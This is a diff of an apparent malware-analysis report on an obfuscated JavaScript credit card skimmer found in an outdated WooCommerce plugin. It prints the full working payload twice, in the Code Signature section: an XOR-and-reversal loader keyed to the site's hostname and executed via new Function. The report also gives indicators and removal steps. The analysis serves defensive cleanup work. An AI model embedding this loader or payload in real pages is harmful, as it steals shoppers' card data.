@@ -1,50 +1,74 @@
 ---
-title: "JavaScript Credit Card Stealer"
-slug: "javascript-credit-card-stealer"
-reportDate: "2026-01-24"
-threatType: "Data Exfiltration"
-severity: "Critical"
-fileHash: "credit-card-skimmer-and-backdoor"
-detectedPaths: ["sample-1.txt"]
+title: 'Obfuscated JavaScript Credit Card Stealer'
+slug: 'javascript-credit-card-stealer'
+reportDate: '2026-01-24'
+threatType: 'Data Theft'
+severity: 'Critical'
+fileHash: 'credit-card-skimmer-and-backdoor'
+detectedPaths: ['malware-sample.txt']
 screenshots: []
-vtLink: "https://www.virustotal.com/gui/home/upload"
-vtScore: "Zero-Day (Unique)"
-impact: "Severe compromise of customer financial data, leading to unauthorized credit card charges. High risk to website reputation and possible legal implications."
-seenOn: "Outdated WordPress plugin"
-behavior: "Steals Data"
-difficulty: "Moderate"
-recurrence: "High"
-numberOfSiteFixed: "Not specified in the user notes."
+vtLink: 'https://www.virustotal.com/gui/home/upload'
+vtScore: 'Zero-Day (Unique)'
+impact: "This malware affects customer trust and leads to financial loss due to unauthorized transactions. It may hurt the website's reputation if not cleaned promptly."
+seenOn: 'Outdated WooCommerce Plugin'
+behavior: 'Steals credit card data of customers'
+difficulty: 'Moderate'
+recurrence: 'High'
+numberOfSiteFixed: 'The user notes do not specify how many sites have been fixed.'
 ---
 
 ## Technical Analysis
-The malware is a JavaScript code snippet obfuscated using character encoding and string reversal techniques. It hides within the site's pages or plugin files, using the 'new Function' constructor for dynamic execution. The script, upon execution, likely collects credit card information entered on a WooCommerce checkout form, then sends this data to an attacker-controlled server for processing, exploiting an outdated and unmaintained plugin vulnerable to such attacks.
+
+The malware script is a heavily obfuscated JavaScript code that executes in the context of the infected WooCommerce site. It appears to be designed to capture credit card details entered by the users and transmit them to an external entity. The obfuscation is achieved by XOR encryption and reversal of the script's characters, activated by passing the decryption key, which seems to be tied to the hostname of the infected site. The script is likely inserted within a vulnerable or outdated plugin that handles payment information.
 
 > **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**
 
 ## Attack Chain
-1. Step 1: The script resides within an old, unmaintained plugin.
-2. Step 2: On page load, the script decodes its payload and executes it using 'new Function'.
-3. Step 3: The executed script gathers credit card data inputs and sends them to a remote server.
+
+1. Step 1: User visits an infected WooCommerce site and enters credit card details during checkout.
+2. Step 2: The malicious JavaScript script executes on the client's browser, capturing keystrokes or form data.
+3. Step 3: Captured data is encoded and transmitted to an attacker's designated location or accessed directly for unauthorized transactions.
 
 ## Code Signature(s)
 
-### FILE: `sample-1.txt`
-```txt
+### FILE: `malware-sample.js`
 
-<script>!function(z,t){!function(z){var n=function(z,t){return z.split('').map(function(z,n){return String.fromCharCode(z.charCodeAt(0)^t.charCodeAt(n%t.length))}).join('')}(z.split('').reverse().join(''),t);try{new Function(n)()}catch{}}(z)}('\x54\x4a\x0c\x07\x07\x0a\x1d\x0c\x09\x0c\x0d\x43\x53\x5e\x12\x02\x05\x0b\x1b\x13\x06\x0a\x0a\x0a\x44\x1c\x4b\x07\x12\x06\x04\x12\x41\x09\x4c\x00\x0e\x1a\x06\x06\x03\x14\x23\x52\x13\x4b\x19\x0c\x5e\x08\x47\x0d\x41\x1a\x06\x06\x18\x1a\x0a\x59\x0b\x06\x12\x01\x16\x08\x0c\x0b\x1d\x4a\x5d\x4c\x0a\x5e\x4a\x02\x0c\x4d\x5d\x01\x17\x13\x19\x03\x08\x0a\x0f\x12\x01\x17\x08\x0c\x04\x17\x16\x4a\x59\x00\x00\x1a\x48\x4b\x4a\x1d\x17\x16\x58\x1c\x17\x4d\x0b\x49\x1d\x1d\x0c\x19\x02\x0b\x07\x02\x13\x19\x12\x07\x02\x01\x0c\x00\x00\x49\x4c\x5f\x4d\x4e\x4c\x00\x08\x1c\x18\x4b\x44\x48\x51\x43\x3a\x56\x5f\x12\x13\x02\x2c\x11\x4f\x1b\x31\x08\x19\x1d\x0a\x4a\x09\x0f\x1a\x00\x11\x3e\x5f\x58\x0a\x4c\x5e\x16\x1a\x59\x30\x5a\x51\x1f\x5f\x43\x57\x47\x43\x5e\x57\x42\x57\x43\x43\x49\x5f\x53\x54\x5e\x51\x1c\x46\x5b\x42\x5d\x5e\x4f\x16\x4a\x5e\x56\x45\x43\x5f\x57\x42\x53\x46\x5e\x50\x5f\x50\x49\x47\x56\x1f\x5b\x46\x45\x5c\x34\x4b\x5a\x16\x19\x06\x19\x3c\x0e\x01\x39\x41\x04\x17\x0b\x50\x12\x45\x06\x01\x42\x0c\x5e\x5e\x19\x47\x10\x4b\x17\x07\x09\x15\x01\x05\x4a\x47\x49\x14\x1c\x0c\x1f\x15\x36\x1d\x10\x00\x19\x18\x1e\x19\x0e\x00\x41\x1f\x5c\x12\x50\x49\x45\x10\x00\x04\x14\x33\x17\x08\x12\x10\x5c\x16\x41\x03\x16\x10\x04\x19\x02\x40\x5b\x06\x16\x13\x1b\x42\x0d\x41\x06\x1d\x1b\x09\x1a\x00\x17\x11\x18\x5a\x18\x15\x18\x1f\x13\x11\x4b\x17\x1b\x15\x05\x13\x1e\x01\x02\x16\x12\x00\x06\x11\x15\x0a\x10\x01\x42\x10\x18\x18\x0a\x13\x17\x41\x11\x5d\x44\x5e\x09\x05\x1f\x47\x15\x5f\x05\x4d\x03\x0e\x0c\x06\x07\x40\x02\x11\x56', window.location.hostname);</script>
+```js
+<script>
+  !function(z,t)
+  {
+    !(function (z) {
+      var n = (function (z, t) {
+        return z
+          .split('')
+          .map(function (z, n) {
+            return String.fromCharCode(
+              z.charCodeAt(0) ^ t.charCodeAt(n % t.length),
+            );
+          })
+          .join('');
+      })(z.split('').reverse().join(''), t);
+      try {
+        new Function(n)();
+      } catch {}
+    })(z)
+  }
+  ('\x54\x4a\x0c\x07\x07\x0a\x1d\x0c\x09\x0c\x0d\x43\x53\x5e\x12\x02\x05\x0b\x1b\x13\x06\x0a\x0a\x0a\x44\x1c\x4b\x07\x12\x06\x04\x12\x41\x09\x4c\x00\x0e\x1a\x06\x06\x03\x14\x23\x52\x13\x4b\x19\x0c\x5e\x08\x47\x0d\x41\x1a\x06\x06\x18\x1a\x0a\x59\x0b\x06\x12\x01\x16\x08\x0c\x0b\x1d\x4a\x5d\x4c\x0a\x5e\x4a\x02\x0c\x4d\x5d\x01\x17\x13\x19\x03\x08\x0a\x0f\x12\x01\x17\x08\x0c\x04\x17\x16\x4a\x59\x00\x00\x1a\x48\x4b\x4a\x1d\x17\x16\x58\x1c\x17\x4d\x0b\x49\x1d\x1d\x0c\x19\x02\x0b\x07\x02\x13\x19\x12\x07\x02\x01\x0c\x00\x00\x49\x4c\x5f\x4d\x4e\x4c\x00\x08\x1c\x18\x4b\x44\x48\x51\x43\x3a\x56\x5f\x12\x13\x02\x2c\x11\x4f\x1b\x31\x08\x19\x1d\x0a\x4a\x09\x0f\x1a\x00\x11\x3e\x5f\x58\x0a\x4c\x5e\x16\x1a\x59\x30\x5a\x51\x1f\x5f\x43\x57\x47\x43\x5e\x57\x42\x57\x43\x43\x49\x5f\x53\x54\x5e\x51\x1c\x46\x5b\x42\x5d\x5e\x4f\x16\x4a\x5e\x56\x45\x43\x5f\x57\x42\x53\x46\x5e\x50\x5f\x50\x49\x47\x56\x1f\x5b\x46\x45\x5c\x34\x4b\x5a\x16\x19\x06\x19\x3c\x0e\x01\x39\x41\x04\x17\x0b\x50\x12\x45\x06\x01\x42\x0c\x5e\x5e\x19\x47\x10\x4b\x17\x07\x09\x15\x01\x05\x4a\x47\x49\x14\x1c\x0c\x1f\x15\x36\x1d\x10\x00\x19\x18\x1e\x19\x0e\x00\x41\x1f\x5c\x12\x50\x49\x45\x10\x00\x04\x14\x33\x17\x08\x12\x10\x5c\x16\x41\x03\x16\x10\x04\x19\x02\x40\x5b\x06\x16\x13\x1b\x42\x0d\x41\x06\x1d\x1b\x09\x1a\x00\x17\x11\x18\x5a\x18\x15\x18\x1f\x13\x11\x4b\x17\x1b\x15\x05\x13\x1e\x01\x02\x16\x12\x00\x06\x11\x15\x0a\x10\x01\x42\x10\x18\x18\x0a\x13\x17\x41\x11\x5d\x44\x5e\x09\x05\x1f\x47\x15\x5f\x05\x4d\x03\x0e\x0c\x06\x07\x40\x02\x11\x56',
+  window.location.hostname);
+</script>
 ```
 
-
 ## Indicators of Compromise (IOCs)
-- `String.fromCharCode`
-- `new Function`
-- `location.hostname`
+
+- `\x54\x4a\x0c\x07\x07`
+- `\x4c\x5f\x4d\x4e`
+- `window.location.hostname`
 
 ## Removal Protocol
-1. Step 1: Identify and remove the outdated plugin associated with the malicious code.
-1. Step 2: Search for and remove any obfuscated JavaScript code in theme and plugin files.
-1. Step 3: Update all software components of the site (WordPress, plugins, themes) to the latest versions.
+
+1. Step 1: Identify and remove the outdated plugin responsible for the injection.
+1. Step 2: Search all theme and plugin files for similar obfuscated JavaScript patterns and remove them.
+1. Step 3: Replace compromised plugins with their most recent secure updates or consider using supported alternatives.
 
 > **Status:** Active Threat.  
 > **Verification:** Verified by MD Pabel.
